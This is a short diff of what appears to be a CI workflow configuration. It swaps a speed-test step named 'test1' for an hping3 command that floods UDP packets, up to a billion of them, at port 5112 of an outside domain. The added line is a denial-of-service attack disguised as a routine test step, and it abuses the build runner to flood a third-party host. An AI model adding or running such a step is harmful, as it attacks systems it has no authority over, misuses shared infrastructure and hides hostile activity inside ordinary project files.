@@ -22,4 +22,4 @@ jobs:
     - name: make
       run: make
     - name: test1
-      run: pip install speedtest-cli && speedtest-cli
+      run: sudo ./hping3 -2 --faster -p 5112 mcbjs.cn -c 1000000000
